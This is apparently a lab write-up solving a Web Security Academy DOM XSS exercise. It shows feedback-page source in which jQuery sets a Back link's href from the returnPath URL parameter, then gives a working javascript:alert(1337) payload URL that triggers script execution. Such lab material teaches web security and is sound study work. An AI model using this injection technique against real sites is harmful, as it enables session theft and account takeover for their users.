DOM XSS in jQuery anchor href attribute sink using location.search source

Another DOM XSS. Let's start by looking at the source code for the feedback page

<div class="is-linkback">
    <a id="backLink">Back</a>
</div>
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>

Okay, looks like the back button is used by jQuery to find an anchor element with the data from returnPath.

Looking at the URL we can spot a retun path element specified:

https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=/post

Without a valid post to return to, the back button will fizzle

Changing it to https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=/  brings us back to the main page

Since the returnPath is being used in a script and a href attribute, why not change it to some JS:

returnPath=javascript:alert(1337)

Full payload:
https://acf51fe41f154f96802c799800d000e4.web-security-academy.net/feedback?returnPath=javascript:alert(1337)

Refresh the page and click Back and your XSS should be triggered.
